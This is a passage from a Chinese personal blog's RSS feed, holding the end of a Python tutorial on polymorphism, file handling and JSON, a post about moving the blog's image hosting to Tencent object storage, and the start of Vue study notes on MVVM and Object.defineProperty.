&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Dog&lt;/span&gt;(Pet):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;make_voice&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;: 汪汪汪...&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_nickname)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Cat&lt;/span&gt;(Pet):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;make_voice&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;: 喵...喵...&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_nickname)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在上面代码中，创建了 &lt;code&gt;Pet&lt;/code&gt; 抽象类，抽象类就是不能够被创建成对象的类，它是专门用来让其他类继承它。Python中没有Java那样对抽象类的支持，但是可以使用 &lt;code&gt;abc&lt;/code&gt; 模块的 &lt;code&gt;ABCMeta&lt;/code&gt; 元类和 &lt;code&gt;abstractmethod&lt;/code&gt; 包装器来达到抽象类的效果。&lt;code&gt;Dog&lt;/code&gt; 和 &lt;code&gt;Cat&lt;/code&gt; 类分别继承了抽象类 &lt;code&gt;Pet&lt;/code&gt; 并重写了 &lt;code&gt;make_voice&lt;/code&gt; 方法，当分别创建两个对象并调用方法时，这个方法就表现出了多态行为。&lt;/p&gt;
&lt;h2 id="文件和异常"&gt;文件和异常
&lt;/h2&gt;&lt;p&gt;开发中经常需要将数据持久化存储，最简单的方式就是存到文件中，Python可以使用 &lt;code&gt;open&lt;/code&gt; 函数，指定文件名、操作模式、编码信息等获取到操作文件的对象。具体的操作模式如下表&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;操作模式&lt;/th&gt;
&lt;th&gt;具体含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;'r'&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;读取 （默认）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;'w'&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;写入（会先截断之前的内容）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;'x'&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;写入，如果文件已经存在会产生异常&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;'a'&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;追加，将内容写入到已有文件的末尾&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;'b'&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;二进制模式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;'t'&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;文本模式（默认）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;'+'&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;更新（既可以读又可以写）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;下图是来自菜鸟教程中的辅助图记。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://www.runoob.com/wp-content/uploads/2013/11/2112205-861c05b2bdbc9c28.png"
loading="lazy"
alt="文件操作"
&gt;&lt;/p&gt;
&lt;h3 id="读写文本文件"&gt;读写文本文件
&lt;/h3&gt;&lt;p&gt;读取文件时使用 &lt;code&gt;r&lt;/code&gt; 操作模式即可，&lt;code&gt;encoding&lt;/code&gt; 参数可以指定编码（若未指定，默认值是None，读取时会使用系统默认编码），如果编码不一致会无法解码导致读取失败。读取文件时会遇到各种错误如：文件找不到会引发 &lt;code&gt;FileNotFoundError&lt;/code&gt;，指定了未知的编码会引发 &lt;code&gt;LookupError&lt;/code&gt;，而如果读取文件时无法按指定方式解码会引发 &lt;code&gt;UnicodeDecodeError&lt;/code&gt;，可以使用 &lt;code&gt;try-except&lt;/code&gt; 代码块捕获异常&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; f &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; f &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#39;致橡树.txt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(f&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;FileNotFoundError&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#39;无法打开指定的文件!&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;LookupError&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#39;指定了未知的编码!&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UnicodeDecodeError&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#39;读取文件时解码错误!&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;finally&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; f&lt;span style="color:#f92672"&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; main()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;try-except&lt;/code&gt; 代码块最后可以使用 &lt;code&gt;finally&lt;/code&gt; 块执行外部资源的释放的操作，因为在它其中的代码，不论程序正常还是异常执行都会被执行，即使是 &lt;code&gt;sys&lt;/code&gt; 的 &lt;code&gt;exit&lt;/code&gt; 函数都会被执行，因为 &lt;code&gt;exit&lt;/code&gt; 函数实质上是引发了 &lt;code&gt;SystemExit&lt;/code&gt; 异常。
除了 &lt;code&gt;finally&lt;/code&gt; 块来执行外部资源的释放以外，还可以使用 &lt;code&gt;with&lt;/code&gt; 关键字指定文件对象的上下文环境并在离开上下文环境时自动释放文件资源。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#39;致橡树.txt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(f&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read())
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;除了使用 &lt;code&gt;read&lt;/code&gt; 方法读取文件内容以外，还可以使用 &lt;code&gt;for-in&lt;/code&gt; 循环逐行读取或是 &lt;code&gt;readlines&lt;/code&gt; 将文件按行读取到一个列表容器中。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#39;致橡树.txt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(f&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ith open(&lt;span style="color:#e6db74"&gt;&amp;#39;致橡树.txt&amp;#39;&lt;/span&gt;, mode&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; line &lt;span style="color:#f92672"&gt;in&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(line, end&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#39;致橡树.txt&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; lines &lt;span style="color:#f92672"&gt;=&lt;/span&gt; f&lt;span style="color:#f92672"&gt;.&lt;/span&gt;readlines()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(lines)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果想要写入文件可以使用 &lt;code&gt;w&lt;/code&gt; 操作模式，但是其会覆盖文件原来的内容，如果想要追加内容可以使用 &lt;code&gt;a&lt;/code&gt; 操作模式&lt;/p&gt;
&lt;h3 id="读写二进制文件"&gt;读写二进制文件
&lt;/h3&gt;&lt;p&gt;二进制文件常见的有图片的复制或写入图片内容，需要使用二进制模式 &lt;code&gt;b&lt;/code&gt;，可以接合读或写模式为 &lt;code&gt;rb&lt;/code&gt; 、&lt;code&gt;wb&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id="读写json文件"&gt;读写JSON文件
&lt;/h3&gt;&lt;p&gt;一个JSON数据类型和Python数据类型的对照表&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;JSON&lt;/th&gt;
&lt;th&gt;Python&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;object&lt;/td&gt;
&lt;td&gt;dict&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;array&lt;/td&gt;
&lt;td&gt;list&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;string&lt;/td&gt;
&lt;td&gt;str&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;number (int / real)&lt;/td&gt;
&lt;td&gt;int / float&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;true / false&lt;/td&gt;
&lt;td&gt;True / False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;null&lt;/td&gt;
&lt;td&gt;None&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Python 中的 &lt;code&gt;json&lt;/code&gt; 模块包含了对 JSON 格式字串操作的函数，分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dump&lt;/code&gt; - 将 Python 对象按照 JSON 格式序列化到文件中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dumps&lt;/code&gt; - 将 Python 对象序列化为 JSON 格式字串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;load&lt;/code&gt; - 和 dump 相反。(将文件中的 JSON 数据反序列化为 Python 对象)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;loads&lt;/code&gt; -和 dumps相反。（将字符串的内容反序列化成Python对象）&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mydict &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;tieba&amp;#34;&lt;/span&gt;:{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;type&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;image&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;container&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; { &lt;span style="color:#e6db74"&gt;&amp;#34;icon&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt; img src =&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;emoji/tieba/呵呵.png&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;gt;&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;text&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;呵呵&amp;#34;&lt;/span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; { &lt;span style="color:#e6db74"&gt;&amp;#34;icon&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt; img src =&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;emoji/tieba/哈哈.png&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;gt;&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;text&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;哈哈&amp;#34;&lt;/span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#39;data.json&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;, encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; fs:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; json&lt;span style="color:#f92672"&gt;.&lt;/span&gt;dump(mydict, fs)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;留个异常的坑以后来填。&lt;a class="link" href="https://segmentfault.com/a/1190000007736783" target="_blank" rel="noopener"
&gt;总结：Python中的异常处理&lt;/a&gt;&lt;/p&gt;</description></item><item><title>博客图床迁移</title><link>https://www.braindance.top/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/</link><pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/</guid><description>&lt;h2 id="起因"&gt;起因
&lt;/h2&gt;&lt;p&gt;原来博客的图片使用Jsdelivr和github的方式存储访问，但是最近Jsdelivr频繁的被墙，感觉可能在未来的不久会失效，毕竟好多人用来当免费的CDN（&lt;del&gt;比如我&lt;/del&gt;），也会有人使用其访问些zz敏感或其他的文件，被墙了也情有可原，而且github的仓库的作用也是用来存储代码而非图床，像我这样的人也导致了仓库的滥用，所以决定找个新的途径。&lt;/p&gt;
&lt;h2 id="过程"&gt;过程
&lt;/h2&gt;&lt;p&gt;当时在网上找了好久，最后在loc上找到了 一个&lt;a class="link" href="https://hostloc.com/thread-807685-1-1.html" target="_blank" rel="noopener"
&gt;帖子&lt;/a&gt;，感觉把目前行得通的方法都列出来了。&lt;/p&gt;
&lt;p&gt;一、第三方存储&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;github+jsdelivr 或 gitee 可以搭配PicGo使用&lt;/li&gt;
&lt;li&gt;茎肛互撸娃大佬的鸡霸图床&lt;/li&gt;
&lt;li&gt;国内对象存储&lt;/li&gt;
&lt;li&gt;使用Onedrive 或 Google Drive 搭建图床&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;二、自行搭建&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;（腾讯云轻量香港 or CDN） 反代 （本地 or 大盘鸡）&lt;/li&gt;
&lt;li&gt;北岸域名+国内机器&lt;/li&gt;
&lt;li&gt;国内机器非标准端口&lt;/li&gt;
&lt;li&gt;家宽开通公网IP存在家里&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;三、直接嵌在文档中，图片转base64，markdown插入&lt;/p&gt;
&lt;p&gt;最后我是选择了良心云的cos对象存储，新用户第一年便宜，就算以后续费一年差不多也70左右。之前自己有了解过对象存储这一技术，但是当时听闻的是有人被套路云的流量计费给掏空了，这次在良心云的计费方式中找到了按量计费，这也刚好满足了博客图片也不多的需求，更不怕被人把钱包给刷爆了。&lt;/p&gt;
&lt;p&gt;上传的方式还是配合PicGo上传，又添加了一个&lt;a class="link" href="https://github.com/liuwave/picgo-plugin-rename-file" target="_blank" rel="noopener"
&gt;rename-file&lt;/a&gt;插件实现上传路径的命名。因为感觉对象存储给的链接太长，国内没有备案的域名，使用了一个服务器直接域名重定向到对象存储给的域名。&lt;/p&gt;
&lt;h2 id="结果"&gt;结果
&lt;/h2&gt;&lt;p&gt;宣布从这篇文章开始往后的图片都会用对象存储，之前的文章如果有需要评论或者联系我再补上吧。&lt;/p&gt;
&lt;h3 id="插曲避坑"&gt;插曲（避坑）
&lt;/h3&gt;&lt;p&gt;期间使用对象存储测试图片的时候，发现过一阵子图片就访问不了了，去桶里一看发现空空如也，发生了两次清空也不知道啥原因，最后一次点了下清空存储桶，发现使用方式里有个&lt;strong&gt;生命周期管理&lt;/strong&gt;，发现是这玩意自动删除文件，所以记得把&lt;strong&gt;生命周期规则修改一下&lt;/strong&gt;。&lt;/p&gt;</description></item><item><title>Vue学习笔记</title><link>https://www.braindance.top/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 07 Mar 2022 18:16:47 +0800</pubDate><guid>https://www.braindance.top/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid><description>&lt;h2 id="理解mvvm"&gt;理解MVVM
&lt;/h2&gt;&lt;p&gt;Vue参考的MVVM模型&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/16466499314121646649931302.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;M：模型(Model) ：data中的数据
V：视图(View) ：模板代码
VM：视图模型(ViewModel)：Vue实例
观察发现：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;data中所有的属性，最后都出现在了vm身上。&lt;/li&gt;
&lt;li&gt;vm身上所有的属性及Vue原型上所有属性，在Vue模板中都可以直接使用。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="数据代理"&gt;数据代理
&lt;/h2&gt;&lt;h3 id="回顾objectdefineproperty方法"&gt;回顾Object.defineProperty方法
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-vue" data-lang="vue"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;let&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;number&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;18&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;object&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;defineProperty&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;person&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;age&amp;#39;&lt;/span&gt;,{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;18&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;enumerable&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;，&lt;/span&gt;&lt;span style="color:#75715e"&gt;//控制属性是否可以枚举，默认值是false
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;writable&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;，&lt;/span&gt;&lt;span style="color:#75715e"&gt;//控制属性是否可以被修改，默认值是false
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;configurable&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt; &lt;span style="color:#75715e"&gt;//控制属性是否可以被删除，默认值是false
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//当有人读取person的age属性时，get函数（getter)就会被调用，且返回值就是age的值
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;},
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;set&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;number&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="数据代理-1"&gt;数据代理
